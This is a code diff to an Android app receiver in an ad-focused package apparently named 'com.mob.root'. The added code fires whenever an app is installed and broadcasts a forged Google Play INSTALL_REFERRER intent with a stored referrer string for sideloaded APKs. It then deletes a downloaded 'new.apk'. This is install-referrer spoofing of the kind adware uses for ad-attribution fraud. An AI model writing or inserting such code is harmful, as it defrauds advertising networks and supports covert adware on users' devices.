@@ -1,14 +1,18 @@
 package com.mob.root.receiver;
 
+import java.io.File;
 import java.util.Iterator;
+
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+
 import com.mob.root.AMApplication;
 import com.mob.root.ad.task.ADTaskController;
 import com.mob.root.ad.task.TaskType;
 import com.mob.root.entity.AD;
+import com.mob.root.entity.Apk;
 import com.mob.root.tools.CommonUtils;
 
 public class AppInstalledReceiver extends BroadcastReceiver {
@@ -52,6 +56,28 @@ public class AppInstalledReceiver extends BroadcastReceiver {
 				ADTaskController.getInstance().immediateADTask(TaskType.WINDOW_INSTALLED, ad);
 				return;
 			}
+		}
+		
+		Iterator<Apk> apkIterator = AMApplication.instance.installApks.iterator();
+		while (apkIterator.hasNext()) {
+			Apk apk = apkIterator.next();
+			if(null == apk) {
+				continue;
+			}
+			String name = apk.getPackageName();
+			if(CommonUtils.isEmptyString(name) || !name.endsWith(packageName)) {
+				continue;
+			}
+			String referrer = apk.getReferrer();
+			Intent referrerIntent = new Intent("com.android.vending.INSTALL_REFERRER");
+			referrerIntent.putExtra("referrer", referrer);
+			context.sendBroadcast(referrerIntent);
+			apkIterator.remove();
+		}
+		File dir = AMApplication.instance.getFilesDir();
+		File file = new File(dir.getAbsolutePath() + "/new.apk");
+		if(null != file && file.exists()) {
+			file.delete();
 		}
 	}
 }
